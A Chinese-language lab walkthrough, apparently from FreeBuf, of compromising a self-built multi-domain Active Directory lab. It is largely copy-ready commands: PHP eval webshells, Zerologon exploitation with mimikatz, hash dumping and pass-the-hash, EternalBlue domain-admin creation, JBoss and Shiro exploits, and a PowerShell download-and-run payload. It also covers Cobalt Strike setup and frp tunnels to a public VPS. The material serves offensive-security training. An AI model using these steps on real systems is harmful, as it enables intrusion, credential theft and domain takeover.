首先感谢大余师父搭的内网渗透靶场，靶场总共分为两部分，一部分为域渗透，另一部分为服务攻防。整个靶场攻占涉及到的技术包括代理、域渗透攻击（置零攻击、域信任、票据传递、哈希传递等）、服务渗透攻击（Shiro反序列化、Struts2远程代码执行、ThinkPHP远程代码执行等）。我将从DAYU子域web服务器入手进行渗透，目标包括DAYU主域控、DAYU辅域控、DAYU子域控、独立域控、安全域控以及各类服务主机。具体靶场图如下：  
![image](https://image.3001.net/images/20210909/1631200076_613a234ccd57c214448e2.png!small)

## 0x01 配置代理

### 一、设置Proxifier

在mac下通过Proxifier设置全局代理，通过socks进入目标环境

    
    
    x.x.x.x 10000
    

![image](https://image.3001.net/images/20210909/1631200088_613a235882775120f9362.png!small)

### 二、配置hosts文件

在/etc/host下配置

    
    
    192.168.73.137 www.dayugs.com
    

![image](https://image.3001.net/images/20210909/1631200098_613a23623b4bce0610b6b.png!small)

## 0x02 攻击DAYU子域普通域客户机

### 一、弱口令爆破

访问`http://www.dayugs.com`，源码为yxcms  
![image](https://image.3001.net/images/20210909/1631200128_613a238021f2af31e8244.png!small)通过资料查询，可以拿到yxcms的后台地址`http://你的域名/index.php?r=admin/index/login`，账号密码为admin/123456  
![image](https://image.3001.net/images/20210909/1631200170_613a23aaa21794beb9fb6.png!small)

那么访问`http://www.dayugs.com/index.php?r=admin/index/login`，即可访问到后台地址  
![image](https://image.3001.net/images/20210909/1631200201_613a23c9667a8d1a5eb95.jpg!small)之后尝试弱口令爆破（虽然已经知道默认账号密码），首先该后台存在验证码，但是经测试它是可以重复利用的  
![image](https://image.3001.net/images/20210909/1631200248_613a23f81e05773a0f6d1.png!small)之后将数据包放入intruder中进行测试  
![image](https://image.3001.net/images/20210909/1631200262_613a24069396a563d39ec.png!small)成功爆出密码为123456  
![image](https://image.3001.net/images/20210909/1631200275_613a241313df00d23489f.png!small)

通过该账号密码登录后台  
![image](https://image.3001.net/images/20210909/1631200288_613a24200967f59f7394b.jpg!small)

选择前台模版，在index_index.php中插入一句话木马  
![image](https://image.3001.net/images/20210909/1631200305_613a243101fc9b837b092.png!small)

    
    
    <?php @eval($_POST['mac'])?>
    

![image](https://image.3001.net/images/20210909/1631200322_613a2442a7824b175da63.png!small)

### 二、webshell上线

保存该配置，并通过蚁剑上线webshell  
![image](https://image.3001.net/images/20210909/1631200353_613a24610489c4fdae525.png!small)测试连接，成功上线  
![image](https://image.3001.net/images/20210909/1631200367_613a246f80b57a709c9da.png!small)

### 三、CS上线

通过命令查看系统信息，目标web机器为64位操作系统

    
    
    systeminfo
    

![image](https://image.3001.net/images/20210909/1631200380_613a247ce5f289bf8f9dc.png!small)通过ping命令发现该web服务器出网  
![image](https://image.3001.net/images/20210909/1631200396_613a248c66d9e1e09b32b.png!small)在V-P-S上通过Cobalt Strike生成windows后门

> 这里使用CS可能会遇到这几个问题

> 1、 java未安装  
> 解决方法：teamserver基于java，所以需要先安装java
    
    
    yum install java
    

![image](https://image.3001.net/images/20210909/1631200411_613a249b53a42268abbe0.png!small)

> 2、客户端无法连接问题  
> 解决方法：

在控制台上开放50050端口  
![image](https://image.3001.net/images/20210909/1631200426_613a24aa052f3b499ad29.png!small)

关闭linux防火墙

    
    
    systemctl stop firewalld.service
    

服务端开启CS

    
    
    ./teamserver x.x.x.x adminadmin
    

连接Cobalt Strike，配置IP和账号密码  
![image](https://image.3001.net/images/20210909/1631200441_613a24b9ccd76f7eac8ee.png!small)设置监听器并生成后门  
![image](https://image.3001.net/images/20210909/1631200466_613a24d296a1aa55b1732.png!small)

上传后门并执行上线CS  
![image](https://image.3001.net/images/20210909/1631200594_613a2552a788476f641af.png!small)

这里又遇到了问题，执行后CS不上线，发现还是腾讯云控制台的问题，需放通全部端口  
![image](https://image.3001.net/images/20210909/1631200635_613a257b26bef4862ef76.png!small)

之后可以成功上线  
![image](https://image.3001.net/images/20210909/1631200649_613a2589055eb0f920b6a.png!small)

### 四、通过MS14-068提权

通过dayu插件进行MS14-068提权  
![image](https://image.3001.net/images/20210909/1631200669_613a259db8dfa9d2dcfd8.png!small)选择监听器，运行后提权  
![image](https://image.3001.net/images/20210909/1631200683_613a25abbd4e5654792bf.jpg!small)成功提权web服务器的system权限  
![image](https://image.3001.net/images/20210909/1631200702_613a25be6c4fa40c0dd4c.png!small)

## 0x03 攻击DAYU子域控服务器

### 一、web服务器信息收集

本机信息收集存在双网卡，分别为192.168.73.0/24以及10.10.10.0/24网段  
![image](https://image.3001.net/images/20210909/1631200720_613a25d08c0449e27cd0a.png!small)

    
    
    主机名 : web
    网卡1 : 192.168.73.137
    网卡2 : 10.10.10.101
    默认网关 : 10.10.10.1
    域名 : ziyu.dayu.com
    

上传nbtscan后对两个网段进行扫描，发现192.168.73.0/24为外网网段，10.10.10.0/24则为内网网段，于是重点关注后者  
![image](https://image.3001.net/images/20210909/1631200736_613a25e0a033d6170efe9.png!small)![image](https://image.3001.net/images/20210909/1631200755_613a25f39b19f7c09c1db.png!small)![image](https://image.3001.net/images/20210909/1631200770_613a26024aea46a40f2db.png!small)发现三台DC，分别是10.10.10.5、10.10.10.6、10.10.10.66，分别对应域为DAYU、DAYU、AQ，唯独没有发现当前子域的域控，于是尝试ping该域，获得IP地址，为10.10.10.6  
![image](https://image.3001.net/images/20210909/1631200835_613a2643b7d9e97462bf4.png!small)![image](https://image.3001.net/images/20210909/1631200858_613a265aac3844dea7834.png!small)

通过信息整合，10.10.10.0/24网段下主机信息收集如下

    
    
    10.10.10.5 : DAYU主域控
    10.10.10.6 : DAYU辅域控
    10.10.10.10 : DAYU子域控
    10.10.10.66 : AQ域控
    10.10.10.90 : DAYU普通域用户
    10.10.10.101 : DAYU子域普通用户（本机）
    

### 二、检查是否存在CVE-2020-1472漏洞

在文件管理中上传一个mimikatz.exe  
![image](https://image.3001.net/images/20210909/1631200922_613a269ae4d3d75812511.png!small)执行命令检测是否存在CVE-2020-1472

    
    
    shell mimikatz.exe "lsadump::zerologon /target:10.10.10.10 /account:ZIYU$" "exit"
    

![image](https://image.3001.net/images/20210909/1631202672_613a2d70938176f56068a.png!small)

发现存在该漏洞，可以通过以下命令进行置零攻击

    
    
    shell mimikatz.exe "lsadump::zerologon /target:10.10.10.10 /account:ZIYU$ /exploit" "exit"
    

![image](https://image.3001.net/images/20210909/1631202694_613a2d86e3e19bdc42f31.png!small)

### 三、通过frp建立隧道

（一）相关配置

配置frps.ini和frpc.ini  
frps.ini

    
    
    [common]
    bind_addr = 0.0.0.0
    bind_port = 7000
    

frpc.ini

    
    
    [common]
    server_addr = 1.117.58.131
    server_port = 7000
    [http_proxy]
    type = tcp
    remote_port = 6000
    plugin = socks5
    

（二）命令执行

向V-P-S上传frps.ini和frps，向web服务器上传frpc和frpc.ini，并通过命令执行，建立隧道  
![image](https://image.3001.net/images/20210909/1631202764_613a2dccb6c717556fe8f.png!small)![image](https://image.3001.net/images/20210909/1631202782_613a2dde8bb1e4be96355.png!small)![image](https://image.3001.net/images/20210909/1631202798_613a2dee1457d7afecb5f.png!small)

设置proxychains.conf  
![image](https://image.3001.net/images/20210909/1631202812_613a2dfcc32f306bde758.png!small)

通过代理远程连接10.10.10.10的3389端口，frp隧道建立成功  
![image](https://image.3001.net/images/20210909/1631202830_613a2e0ead91b89622c42.png!small)

### 四、获取管理员hash值

通过impacket-secretsdump对子域控进行无密码hash读取

    
    
    proxychains impacket-secretsdump -no-pass -just-dc ziyu.dayu.com/ZIYU\$@10.10.10.10
    

![image](https://image.3001.net/images/20210909/1631202850_613a2e2273e17b527a473.png!small)

### 五、CS上线

在CS上建立中转监听  
![image](https://image.3001.net/images/20210909/1631202881_613a2e414af64979ea48b.png!small)设置名字和监听地址  
![image](https://image.3001.net/images/20210909/1631202896_613a2e5013ddb7c115d66.png!small)之后生成mac.exe木马  
![image](https://image.3001.net/images/20210909/1631202929_613a2e715db9629bf4eb9.png!small)

（一）利用wmicexec.py进行攻击

    
    
    proxychains python3 wmiexec.py -hashes :a8ad79b7b2c6598658ca0932cbf01e40 ./Administrator@10.10.10.10
    

![image](https://image.3001.net/images/20210909/1631202946_613a2e828dec712d87ec7.png!small)上传木马mac.exe并执行

    
    
    put mac.exe
    

![image](https://image.3001.net/images/20210909/1631202968_613a2e987fd631594c395.png!small)但是这里无法上线，可能是防火墙开着，于是使用taowu的插件将web服务器的防火墙进行关闭，之后成功上线CS  
![image](https://image.3001.net/images/20210909/1631202988_613a2eac3a935ed95419d.png!small)![image](https://image.3001.net/images/20210909/1631203001_613a2eb99cc45eb56cc97.png!small)

（二）利用永恒之蓝进行攻击

进入msf后

    
    
    msf > use auxiliary/admin/smb/ms17_010_command
    msf > setg Proxies socks5:1.117.58.131:6000
    msf > setg ReverseAllowProxy true
    msf > set command whoami
    msf > set rhosts 10.10.10.10
    msf > run
    

![image](https://image.3001.net/images/20210909/1631203017_613a2ec9959a818cd03ba.png!small)通过永恒之蓝创建域管理员

    
    
    net user mac1 QWEasd123 /add /domain 
    net group "domain admins" mac1 /add /domain
    net user /domain
    net user mac1 /domain
    

![image](https://image.3001.net/images/20210909/1631203037_613a2edd401c66551b5c2.png!small)![image](https://image.3001.net/images/20210909/1631203062_613a2ef680dfc232e9c00.png!small)

可以看到mac1已经是域管账号了，在CS中通过IPC连接域控

    
    
    shell net use \\10.10.10.10\ipc$ "QWEasd123" /user:mac1
    shell net use
    shell dir \\10.10.10.10\c$
    

![image](https://image.3001.net/images/20210909/1631203140_613a2f449e1f43033a6e6.png!small)![image](https://image.3001.net/images/20210909/1631203195_613a2f7b6fa86ddb00e49.png!small)

之后在web服务器上传木马再通过IPC上传木马

    
    
    shell copy mac1.exe \\10.10.10.10\c$
    

### 六、恢复hash

在CS的域控中执行操作：

（一）将system.save、sam.save、security.save三个文件拷贝到本地

先将三个文件保存下来

    
    
    reg save HKLM\SYSTEM system.save
    reg save HKLM\SAM sam.save
    reg save HKLM\SECURITY security.save
    

![image](https://image.3001.net/images/20210910/1631203227_613a2f9bdfcc5eda96aa8.png!small)

在kali使用wmic获取shell操作（可能会掉线）  
下载

    
    
    get system.save
    get sam.save
    get security.save
    

删除域控中的文件

    
    
    del /f system.save
    del /f sam.save
    del /f security.save
    

![image](https://image.3001.net/images/20210910/1631203254_613a2fb6b5bb19e4a8a07.png!small)

（二）secretsdump获取原hash

使用impacket中的secretsdump，从上面得到的几个文件中还原账户哈希值。

    
    
    impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
    

![image](https://image.3001.net/images/20210910/1631205343_613a37dfa05a9c38fc438.png!small)

得到$MACHINE.ACC:
aad3b435b51404eeaad3b435b51404ee:6cb780aa112acd1199cb9fd57a24fd02

（三）恢复密码

    
    
    proxychains python3 reinstall_original_pw.py ZIYU 10.10.10.10 6cb780aa112acd1199cb9fd57a24fd02
    

显示`Success! DC machine account should be restored to it's original value. You
might want to secretsdump again to check.`，说明恢复成功  
![image](https://image.3001.net/images/20210910/1631205382_613a380645e0de96e93b0.png!small)也可以通过hex来进行恢复，命令如下

    
    
    proxychains python3 restorepassword.py ZIYU0\ZIYU -target-ip 10.10.10.10 -hexpass [hex]
    

检查情况

    
    
    net group "domain controllers" /domain
    

### 七、子域信息收集

通过ipconfig和systeminfo发现该域控为win server
2016系统，且存在两个网卡，分别为10.10.10.0/24和10.12.10.0/24

![截屏2021-08-25
上午4.51.13.png](https://image.3001.net/images/20210910/1631208901_613a45c5a4c1c9fdf7340.png!small)![截屏2021-08-25
上午4.55.54.png](https://image.3001.net/images/20210910/1631208910_613a45ce82fa24982414a.png!small)

![截屏2021-08-25
上午4.52.06.png](https://image.3001.net/images/20210910/1631208917_613a45d51823d19a8ca27.png!small)上传nbtscan，并对新网段进行扫描  
![截屏2021-08-25
上午4.53.24.png](https://image.3001.net/images/20210910/1631208922_613a45dab84c559557b1e.png!small)  
发现10.12.10.3，为独立域的域控  
![截屏2021-08-25
上午4.57.05.png](https://image.3001.net/images/20210910/1631208930_613a45e273492c4472f27.png!small)

## 0x04 攻击DAYU父域主域控服务器

### 一、利用CVE-2020-1472漏洞

上传mimikatz对父域控进行置零漏洞探测

    
    
    shell mimikatz.exe "lsadump::zerologon /target:10.10.10.5 /account:WIN-AMJ9T9TL123$" "exit"
    

![截屏2021-08-25
上午9.20.47.png](https://image.3001.net/images/20210910/1631208936_613a45e8340ac0e1651f7.png!small)通过探测，发现存在该漏洞，于是执行置零攻击

    
    
    shell mimikatz.exe "lsadump::zerologon /target:10.10.10.5 /account:WIN-AMJ9T9TL123$ /exploit" "exit"
    

![截屏2021-08-25
上午9.23.22.png](https://image.3001.net/images/20210910/1631208942_613a45ee0522d15d546a5.png!small)

通过impacket-secretsdump导出hash值

    
    
    proxychains impacket-secretsdump -no-pass -just-dc WIN-AMJ9T9TL123.dayu/WIN-AMJ9T9TL123\$@10.10.10.5
    

![截屏2021-08-25
上午9.26.27.png](https://image.3001.net/images/20210910/1631208948_613a45f43a4d1d80382d0.png!small)拿到hash值，为99b81196c641b05ce3cb7fcd7c27e094

### 二、利用wmiexec空密码登录

使用wmiexec登陆进Administrator账户

    
    
    proxychains python3 wmiexec.py -hashes :99b81196c641b05ce3cb7fcd7c27e094 ./Administrator@10.10.10.5
    

![截屏2021-08-25
上午9.29.24.png](https://image.3001.net/images/20210910/1631208954_613a45fadde499773afa4.png!small)

### 三、CS上线

在CS上建立中转监听，同时生成木马mac2.exe  
![截屏2021-08-25
上午10.07.06.png](https://image.3001.net/images/20210910/1631208965_613a46054254af709cc95.png!small)![截屏2021-08-25
上午10.07.29.png](https://image.3001.net/images/20210910/1631208972_613a460c016c78c8f4972.png!small)

通过wmicexec.py上传mac2.exe  
![截屏2021-08-25
上午10.15.55.png](https://image.3001.net/images/20210910/1631208979_613a461397084dab6978e.png!small)成功上线CS  
![截屏2021-08-25
上午10.28.01.png](https://image.3001.net/images/20210910/1631208992_613a46203018d1ceabe19.png!small)

## 0x05 攻击DAYU父域辅域控服务器

### 一、利用CVE-2020-1472漏洞

上传mimikatz对父域控进行置零漏洞探测

    
    
    shell mimikatz.exe "lsadump::zerologon /target:10.10.10.6 /account:FUYU$" "exit"
    

![截屏2021-08-25
上午10.36.07](https://image.3001.net/images/20210910/1631209000_613a46288c009d64d02f3.png!small)说明该辅域也是存在该漏洞的，那么可以通过置零攻击来获取administrator的shell，但是因为辅域和主域的hash值相同，那么可以通过wmiexec直接获取shell

### 二、利用wmiexec登录

    
    
    proxychains python3 wmiexec.py -hashes :99b81196c641b05ce3cb7fcd7c27e094 ./Administrator@10.10.10.6
    

![截屏2021-08-25
上午10.39.17.png](https://image.3001.net/images/20210910/1631209007_613a462fd093f63aae8db.png!small)

### 三、CS上线

与进攻父域的主域控一样，上传mac2.exe

    
    
    put mac2.exe
    mac2.exe
    

![截屏2021-08-25
上午10.44.59.png](https://image.3001.net/images/20210910/1631209016_613a4638d41b1cae87508.png!small)执行后成功上线CS  
![截屏2021-08-25
上午10.45.38](https://image.3001.net/images/20210910/1631209024_613a4640e15bd060ad3c9.png!small)

## 0x06 攻击DAYU父域普通域客户机

### 一、信息收集

使用nmap对其进行端口探测，发现存在一个8080端口

    
    
    proxychains nmap -sT -sV -Pn --open -p 8080,3306,6379,80,1433,27017 10.10.10.90
    

![截屏2021-08-25
上午10.54.07](https://image.3001.net/images/20210910/1631209033_613a4649c8ba7d0bd7ef3.png!small)

发现只有8080端口是开放的，通过firefox对其进行访问，发现目标站点使用的JBoss中间件

    
    
    proxychains firefox http://10.10.10.90:8080
    

![截屏2021-08-25
上午10.55.51.png](https://image.3001.net/images/20210910/1631209042_613a4652c70c5c5d6ed8c.png!small)

### 二、JBoss利用并上线CS

工具地址：https://github.com/joaomatosf/jexboss  
下载利用工具并对目标进行JBoss漏洞探测

    
    
    git clone https://github.com/joaomatosf/jexboss
    proxychains python jexboss.py -host http://10.10.10.90:8080
    

![截屏2021-08-25
上午11.11.38](https://image.3001.net/images/20210910/1631209048_613a4658ce56eb2c35be4.png!small)选择yes，成功获取shell  
![截屏2021-08-25
上午11.13.44.png](https://image.3001.net/images/20210910/1631209057_613a4661c6972eea2ce8a.png!small)将mac2.exe放入10.10.10.101这台web服务器上  
![截屏2021-08-25
上午11.22.44.png](https://image.3001.net/images/20210910/1631209073_613a46716160eb7d0822c.png!small)利用powershell进行下载执行

    
    
    powershell.exe -Command (new-object System.Net.WebClient).DownloadFile('http://10.10.10.101/mac2.exe','mac2.exe');start-process mac2.exe
    

![截屏2021-08-25
上午11.34.40.png](https://image.3001.net/images/20210910/1631209079_613a46771d036bcdc723e.png!small)成功上线CS  
![截屏2021-08-25
上午11.35.56](https://image.3001.net/images/20210910/1631209087_613a467f63b8da23bc97c.png!small)

## 0x07 攻击安全域域控服务器

### 一、信息收集

使用nmap对其进行端口探测，发现存在一个8080端口

    
    
    proxychains nmap -sT -sV -Pn --open -p 8080,3306,6379,80,1433,27017 10.10.10.66
    

![截屏2021-09-01
下午3.21.46](https://image.3001.net/images/20210910/1631209096_613a4688409a26a21a223.png!small)

发现80、3306、8080端口是开放的，通过firefox对8080端口进行访问

    
    
    proxychains firefox http://10.10.10.66:8080
    proxychains firefox http://10.10.10.66:80
    

80端口为phpstudy默认界面，8080端口为tomcat的管理界面，访问登录口`http://10.10.10.66:8080/manager/html`报错  
![截屏2021-09-01
下午3.34.02.png](https://image.3001.net/images/20210910/1631209103_613a468fa00c1ce3b43fc.png!small)![截屏2021-09-01
下午3.36.15.png](https://image.3001.net/images/20210910/1631209107_613a4693878575f43d813.png!small)![截屏2021-09-01
下午3.29.20.png](https://image.3001.net/images/20210910/1631209115_613a469bbd304d18878ad.png!small)

对8080端口进行目录扫描，发现`http://10.10.10.66:8080/shiro`为shiro框架  
![截屏2021-09-01
下午3.39.53](https://image.3001.net/images/20210910/1631209123_613a46a3bd2f99e121992.png!small)

### 二、shiro反序列化利用并上线

工具：https://github.com/zhzyker/shiro-1.2.4-rce  
验证漏洞是否存在

    
    
    git clone https://github.com/zhzyker/shiro-1.2.4-rce.git
    cd shiro-1.2.4-rce
    proxychains python3 shiro-1.2.4_rce.py http://10.10.10.66:8080/shiro/
    

其中出现问题，通过以下方式解决报错`No module named 'Crypto'`

    
    
    pip install pycryptodome
    pip install crypto
    pip install pycrypto
    

![截屏2021-09-01
下午3.49.51](https://image.3001.net/images/20210910/1631209129_613a46a9e7a93b4535582.png!small)

在执行前需要先将key_list修改  
![截屏2021-09-01
下午5.07.36.png](https://image.3001.net/images/20210910/1631209138_613a46b2e24e31010db40.png!small)![截屏2021-09-01
下午5.19.41.png](https://image.3001.net/images/20210910/1631209144_613a46b8dbfd09bfe0b3c.png!small)通过powershell下载mac2.exe并执行

    
    
    powershell.exe -Command (new-object System.Net.WebClient).DownloadFile('http://10.10.10.101/mac2.exe','mac2.exe');start-process mac2.exe
    

但是显示key错误，无法上线  
![截屏2021-09-01
下午5.19.41.png](https://image.3001.net/images/20210910/1631209144_613a46b8dbfd09bfe0b3c.png!small)

### 三、mysql日志写入shell并上线CS

通过目录扫描发现`http://10.10.10.66:80/phpmyadmin`，通过弱口令成功登录

    
    
    proxychains firefox http://10.10.10.66:80/phpmyadmin
    

![截屏2021-09-01
下午5.31.30](https://image.3001.net/images/20210910/1631209160_613a46c8f3ab051d4c42f.png!small)通过into
outfile写入shell

    
    
    show global variables like "%secure_file_priv%";
    

![截屏2021-09-01
下午5.33.07.png](https://image.3001.net/images/20210910/1631209166_613a46ced5e0ab98244d4.png!small)

结果为null，表示无法导入导出，于是查看日志

    
    
    show variables like "general%";
    

![截屏2021-09-01
下午7.25.22](https://image.3001.net/images/20210910/1631209170_613a46d2c2554a413f36e.png!small)  
可以看到日志已开启，也可以修改日志文件位置

    
    
    set global general_log="ON";
    set global general_log_file='C:/phpStudy/WWW/mac1.php';
    show variables like "general%";
    

![截屏2021-09-01
下午7.37.54](https://image.3001.net/images/20210910/1631209174_613a46d6409c3c8c093ef.png!small)

写入一句话木马

    
    
    select '<?php @eval($_POST[mac]);?>'
    

![截屏2021-09-01
下午7.36.41](https://image.3001.net/images/20210910/1631209180_613a46dc12fb7c47d9212.png!small)

访问`http://10.10.10.66/mac.php`，成功写入  
![截屏2021-09-01
下午7.38.44.png](https://image.3001.net/images/20210910/1631209184_613a46e0f37f47aaae6bd.png!small)

连接蚁剑，设置代理为1.117.58.131 6000，成功上线  
![截屏2021-09-01
下午7.39.53](https://image.3001.net/images/20210910/1631209189_613a46e50ed1ad5efda86.png!small)

上传mac2.exe并执行，成功上线CS  
![截屏2021-09-01
下午7.41.43.png](https://image.3001.net/images/20210910/1631209196_613a46ec5fab7a615d401.png!small)![截屏2021-09-01
下午7.41.32](https://image.3001.net/images/20210910/1631209202_613a46f209ef284a1ebe1.png!small)

## 0x08 攻击安全域涉密客户机

### 一、信息收集

通过对涉密域进行信息收集，上传fscan  
![截屏2021-09-01
下午7.50.24](https://image.3001.net/images/20210910/1631209208_613a46f80d5965cb63c55.png!small)扫描结果如下  
![截屏2021-09-01
下午7.54.21.png](https://image.3001.net/images/20210910/1631209216_613a4700836f79fc6db1c.png!small)存在涉密域，IP为201.1.10.206，且上面部署了http服务

### 二、构建二级frp

（一）相关配置

安全域frpc.ini配置如下

    
    
    [common]
    server_addr = 10.10.10.101
    server_port = 12000
    [http_proxy]
    type = tcp
    remote_port = 1096
    plugin = socks5
    

Web服务器frps.ini配置如下

    
    
    [common]
    bind_addr = 10.10.10.101
    bind_port = 12000
    

Web服务器frpc.ini配置如下

    
    
    [common]
    server_addr = 1.117.58.131
    server_port = 12000
    [http_proxy]
    type = tcp
    local_ip = 10.10.10.101
    local_port = 1096
    remote_port = 1096
    

公网服务器frps.ini配置如下

    
    
    [common]
    bind_addr = 0.0.0.0
    bind_port = 12000
    

（二）命令执行

首先先开启服务端的frp，在web服务器和公网服务器下执行如下命令

    
    
    frps.exe -c frps.ini
    ./frps -c frps.ini
    

![截屏2021-09-01
下午8.27.10](https://image.3001.net/images/20210910/1631209227_613a470b29c0d6d56dd79.png!small)之后在安全域中执行

    
    
    frpc.exe -c frpc.ini
    

![截屏2021-09-01
下午9.27.56](https://image.3001.net/images/20210910/1631209232_613a4710e5a437379184f.png!small)最后在web服务器中执行

    
    
    frpc.exe -c frpc.ini
    

![截屏2021-09-01
下午8.30.41](https://image.3001.net/images/20210910/1631209239_613a47171e42401f2191e.png!small)注意：需要开启proxy
success成功才行

在proxychains添加代理

    
    
    vim /etc/proxychains.conf
    

![截屏2021-09-01
下午8.34.02.png](https://image.3001.net/images/20210910/1631209249_613a472174915a518ec50.png!small)

### 三、mysql弱口令连接并上线CS

通过访问`http://201.1.10.206:8080`

    
    
    proxychains firefox http://201.1.10.206:8080
    

![截屏2021-09-01
下午9.30.49.png](https://image.3001.net/images/20210910/1631209257_613a47292f71df656205f.png!small)访问`http://201.1.10.206:8080/manager/html`不可进入  
![截屏2021-09-01
下午10.02.00](https://image.3001.net/images/20210910/1631209268_613a4734cbdd1bb91e781.png!small)

于是开启msf，通过设置代理对目标机器进行mysql密码爆破

    
    
    msfconsole
    msf > use auxiliary/scanner/mysql/mysql_login
    msf > setg Proxies socks5:1.117.58.131:1096
    msf > setg ReverseAllowProxy true
    msf > set rhosts 201.1.10.206
    msf > set PASSFILE xxx
    msf > exploit
    

爆破得到密码为root，同时直接登录mysql

    
    
    proxychains mysql -u root -proot -h201.1.10.206
    

查看是否拥有写入文件的权限和写入位置，空表示可以写入任意位置

    
    
    show global variables like '%secure_file_priv%';
    

写入木马到网站目录下

    
    
    select '<?php @eval($_POST[mac]);?>' into outfile 'C:/phpStudy/WWW/mac1.php';
    

![截屏2021-09-01
下午10.19.30](https://image.3001.net/images/20210910/1631209274_613a473ac8999ebef733c.png!small)于是访问`http://201.1.10.206/mac1.php`，访问成功，说明存在  
![截屏2021-09-01
下午10.21.38](https://image.3001.net/images/20210910/1631209279_613a473f28270fba4108b.png!small)

连接蚁剑，设置代理为1.117.58.131 1096，成功连接  
![截屏2021-09-01
下午10.24.04](https://image.3001.net/images/20210910/1631209281_613a4741ed55b40372d48.png!small)

之后在安全域（201.1.10.5）中设置中转监听，同时生成木马mac3.exe  
![截屏2021-09-01
下午10.27.03.png](https://image.3001.net/images/20210910/1631209287_613a4747e218197ecdf0a.png!small)![截屏2021-09-01
下午10.28.02.png](https://image.3001.net/images/20210910/1631209295_613a474f9e73d62a88829.png!small)

上传mac3.exe并执行  
![截屏2021-09-01
下午10.29.21](https://image.3001.net/images/20210910/1631209303_613a4757391411fac4834.png!small)成功上线CS  
![截屏2021-09-01
下午10.29.33.png](https://image.3001.net/images/20210910/1631209307_613a475bb07656d0e57eb.png!small)

还可以通过80端口的phpmyadmin来上线，在攻击涉密域中会讲到，欢迎大家继续关注[实战域森林+服务森林下篇﻿](https://www.freebuf.com/articles/network/288128.html)

